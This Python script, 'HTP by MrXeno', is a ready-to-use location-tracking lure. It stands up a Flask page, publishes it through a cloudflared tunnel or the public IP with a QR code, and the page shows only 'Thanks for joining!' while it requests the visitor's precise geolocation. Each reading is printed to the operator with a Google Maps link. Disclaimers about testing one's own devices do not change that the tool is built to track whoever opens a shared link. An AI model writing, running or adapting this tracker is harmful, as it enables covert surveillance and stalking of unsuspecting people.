#!/usr/bin/env python3
# Patched HTP.py — Windows & Linux friendly cloudflared handling
# IMPORTANT: Use only on devices you own or have explicit permission to test.

import os
import sys
import threading
import time
import re
import subprocess
import platform
import shutil
from pathlib import Path

try:
    import requests
    from flask import Flask, request
except Exception:
    # In Windows we don't run pkg; just try to install via pip if missing.
    print("Installing missing Python packages (if possible)...")
    # Use python -m pip to be safe
    os.system(f'"{sys.executable}" -m pip install --upgrade pip setuptools wheel')
    os.system(f'"{sys.executable}" -m pip install flask requests qrcode[pil] pillow')
    import requests
    from flask import Flask, request

# ---------------- Colors ----------------
RED = "\033[1;91m"
GREEN = "\033[1;92m"
CYAN = "\033[1;96m"
YELLOW = "\033[1;93m"
RESET = "\033[0m"

app = Flask(__name__)
locations = {}

# ---------------- Utility ----------------
def is_windows():
    return platform.system().lower().startswith("windows")

def safe_clear():
    try:
        if is_windows():
            os.system("cls")
        else:
            os.system("clear")
    except Exception:
        pass

def run_cmd(cmd, timeout=None):
    """Run command list or string, return (returncode, stdout+stderr)."""
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, shell=isinstance(cmd, str))
        out, _ = proc.communicate(timeout=timeout)
        return proc.returncode, out
    except subprocess.TimeoutExpired:
        proc.kill()
        return -1, ""
    except Exception as e:
        return -1, str(e)

# ---------------- TOOL LOCK (unchanged) ----------------
def tool_lock():
    safe_clear()
    print(f"{RED}╔{'═'*60}╗{RESET}")
    print(f"{RED}║{'🔒 TOOL LOCKED 🔒'.center(60)}║{RESET}")
    print(f"{RED}║{'HTP BY MrXeno'.center(60)}║{RESET}")
    print(f"{RED}║{'Follow @mrrajrumel 🔔'.center(60)}║{RESET}")
    print(f"{RED}╚{'═'*60}╝{RESET}\n")
    print(f"{YELLOW}This script is for testing on devices you own or where you have explicit permission.{RESET}\n")
    for i in range(9, 0, -1):
        sys.stdout.write(f"\r{CYAN}⏳ Redirecting in {i}...{RESET}")
        sys.stdout.flush()
        time.sleep(1)
    # Try to open FB but ignore errors cross-platform
    try:
        if is_windows():
            # Use start (powershell Start-Process would be better but keep simple)
            subprocess.Popen(['powershell', '-Command', 'Start-Process', 'https://facebook.com/mrrajrumel'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            os.system('am start -a android.intent.action.VIEW -d "https://facebook.com/mrrajrumel" > /dev/null 2>&1 || true')
    except Exception:
        pass
    print(f"\n{GREEN}✅ Redirect attempted (if available).{RESET}\n")
    try:
        input(f"{YELLOW}Press ENTER to continue...{RESET}")
    except Exception:
        pass

# ---------------- Dependencies ----------------
def install_requirements():
    print(f"{CYAN}Checking/attempting to install requirements...{RESET}")
    if is_windows():
        # On Windows assume user has Python & pip; we already tried to pip install above.
        print(f"{YELLOW}Running on Windows — skipping platform package manager steps.{RESET}")
    else:
        # Unix-like: use package manager where appropriate (Termux/Ubuntu)
        # Detect Termux prefix
        prefix = os.environ.get("PREFIX", "")
        if "com.termux" in prefix:
            os.system('pkg update -y > /dev/null 2>&1 || true')
            os.system('pkg install python wget -y > /dev/null 2>&1 || true')
        else:
            # Debian/Ubuntu
            os.system('apt update -y > /dev/null 2>&1 || true')
            os.system('apt install -y python3 python3-venv python3-pip wget curl -y > /dev/null 2>&1 || true')
        # ensure pip packages
        os.system(f'"{sys.executable}" -m pip install --upgrade pip setuptools wheel > /dev/null 2>&1 || true')

# ---------------- Cloudflared ----------------
def download_cloudflared_for_platform(dest_path: Path):
    """Download appropriate cloudflared binary for current platform to dest_path (Path object)."""
    machine = platform.machine().lower()
    system = platform.system().lower()
    url = None

    # Windows
    if is_windows():
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        dest = dest_path.with_suffix('.exe')
    else:
        # Linux/Termux
        if machine in ("aarch64", "arm64"):
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        elif machine.startswith("arm"):
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
        elif machine in ("x86_64", "amd64"):
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        else:
            print(f"{RED}Unsupported CPU architecture: {machine}{RESET}")
            return None

        dest = dest_path

    try:
        print(f"{CYAN}Downloading cloudflared from {url} ...{RESET}")
        # Use requests if available (better), fallback to curl/wget
        try:
            r = requests.get(url, stream=True, timeout=30)
            r.raise_for_status()
            with open(dest, "wb") as f:
                for chunk in r.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
        except Exception:
            # fallback to system curl/wget
            if shutil.which("curl"):
                os.system(f'curl -L "{url}" -o "{dest}"')
            elif shutil.which("wget"):
                os.system(f'wget -q "{url}" -O "{dest}"')
            else:
                print(f"{YELLOW}No curl/wget available; failed to download cloudflared automatically.{RESET}")
                return None

        # Make executable (not needed on Windows but harmless)
        try:
            os.chmod(dest, 0o755)
        except Exception:
            pass

        print(f"{GREEN}✅ cloudflared downloaded to {dest}{RESET}")
        return dest
    except Exception as e:
        print(f"{RED}Failed to download cloudflared: {e}{RESET}")
        return None

def start_cloudflared_tunnel(port=8080, timeout=30):
    """Start cloudflared and parse output for trycloudflare URL. Returns (url, process)."""
    # Locate cloudflared: prefer project bin, then PATH
    project_bin = Path.cwd() / "bin" / ("cloudflared.exe" if is_windows() else "cloudflared")
    fallback_bin = shutil.which("cloudflared")
    chosen = None

    if project_bin.exists():
        chosen = project_bin
    elif fallback_bin:
        chosen = Path(fallback_bin)
    else:
        # Attempt to download into project bin
        Path.cwd().mkdir(parents=True, exist_ok=True)
        (Path.cwd() / "bin").mkdir(parents=True, exist_ok=True)
        chosen = download_cloudflared_for_platform(Path.cwd() / "bin" / ("cloudflared.exe" if is_windows() else "cloudflared"))
        if not chosen:
            print(f"{YELLOW}Could not obtain cloudflared binary automatically.{RESET}")
            return None, None

    cmd = [str(chosen), "tunnel", "--url", f"http://127.0.0.1:{port}"]
    if is_windows():
        # On Windows ensure using list form and no shell
        pass

    print(f"{CYAN}Starting cloudflared: {cmd}{RESET}")

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    except Exception as e:
        print(f"{RED}Failed to start cloudflared: {e}{RESET}")
        return None, None

    url = None
    pattern = re.compile(r"https://[a-z0-9\-]+\.trycloudflare\.com", re.IGNORECASE)
    start_time = time.time()

    # Read lines until timeout or url found
    try:
        while time.time() - start_time < timeout:
            line = proc.stdout.readline()
            if not line:
                time.sleep(0.1)
                continue
            print(f"{YELLOW}Cloudflared: {line.strip()}{RESET}")
            m = pattern.search(line)
            if m:
                url = m.group(0)
                break
    except Exception:
        pass

    if url:
        # keep process running in background
        threading.Thread(target=lambda p: p.wait(), args=(proc,), daemon=True).start()
        return url, proc

    # Not found — try to let it run a bit then kill
    try:
        proc.kill()
    except Exception:
        pass

    return None, None

def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org", timeout=6)
        if r.status_code == 200:
            return r.text.strip()
    except Exception:
        return None

def create_public_url(port=8080):
    # Try cloudflared tunnel first
    url, proc = start_cloudflared_tunnel(port=port, timeout=25)
    if url:
        print(f"{GREEN}✅ Cloudflare tunnel established: {url}{RESET}")
        return url
    # Fallback to public IP
    print(f"{YELLOW}⚠️  Cloudflare tunnel failed, trying public IP...{RESET}")
    ip = get_public_ip()
    if ip:
        print(f"{GREEN}✅ Using public IP: {ip}{RESET}")
        return f"http://{ip}:{port}"
    print(f"{YELLOW}⚠️  Could not determine public IP, using localhost{RESET}")
    return f"http://localhost:{port}"

# ---------------- Flask endpoints ----------------
@app.route("/")
def index():
    return f'''<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HTP</title></head><body>
    <h2>HTP — Requesting location...</h2>
    <p><strong>Thanks for joining!</strong></p>
    <script>
    function send(pos){{
      fetch('/update',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy,timestamp:pos.timestamp}})})
    }}
    function err(e){{
      document.body.innerHTML = "<h3>Error: "+e.message+"</h3><p>Please allow location.</p>";
    }}
    window.onload=function(){{
      if(navigator.geolocation){{
        navigator.geolocation.getCurrentPosition(send, err, {{enableHighAccuracy:true, timeout:10000}});
      }} else {{ document.body.innerHTML = "<h3>Geolocation not supported</h3>"; }}
    }};
    </script>
    </body></html>'''

@app.route("/update", methods=["POST"])
def update():
    try:
        data = request.get_json(force=True)
    except Exception:
        return "BAD", 400
    if not data or "lat" not in data or "lon" not in data:
        return "INVALID", 400
    data["time"] = time.time()
    locations.clear()
    locations.update(data)
    lat = data.get("lat")
    lon = data.get("lon")
    acc = data.get("accuracy", "N/A")
    print(f"\n{GREEN}✅ LIVE LOCATION RECEIVED{RESET}")
    print(f"{CYAN}Latitude: {lat}{RESET}")
    print(f"{CYAN}Longitude: {lon}{RESET}")
    print(f"{CYAN}Accuracy: {acc} m{RESET}")
    print(f"{CYAN}Maps: https://maps.google.com/?q={lat},{lon}{RESET}\n")
    return "OK", 200

# ---------------- QR helper ----------------
def make_qr(url):
    try:
        import qrcode
        out = Path("track_qr.png")
        img = qrcode.make(url)
        img.save(out)
        # cross-platform open
        if is_windows():
            os.startfile(out)  # may raise on some environments
        else:
            os.system(f"termux-open {out} > /dev/null 2>&1 || xdg-open {out} > /dev/null 2>&1 || true")
    except Exception as e:
        print(f"{YELLOW}⚠️  Could not generate QR code: {e}{RESET}")

# ---------------- Server ----------------
def start_server(port=8080):
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False), daemon=True).start()
    time.sleep(2)

# ---------------- Main ----------------
def main():
    tool_lock()
    install_requirements()
    safe_clear()
    print(f"{GREEN}🚀 Starting HTO...{RESET}")
    port = 8080
    public_url = create_public_url(port=port)
    start_server(port)
    if public_url:
        make_qr(public_url)
    print(f"\n{GREEN}{'='*60}{RESET}")
    print(f"{GREEN}{'HTO BY MrXeno'.center(60)}{RESET}")
    print(f"{GREEN}{'='*60}{RESET}")
    print(f"{YELLOW}Public URL: {RESET}{public_url}\n")
    print(f"{YELLOW}Share the link or QR with the user (test on devices you own).{RESET}")
    print(f"{YELLOW}Waiting for live location updates... (Ctrl+C to stop){RESET}")
    last_time = 0
    try:
        while True:
            if locations.get("time", 0) > last_time:
                last_time = locations["time"]
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}🛑 Stopped by user{RESET}")

if __name__ == "__main__":
    main()
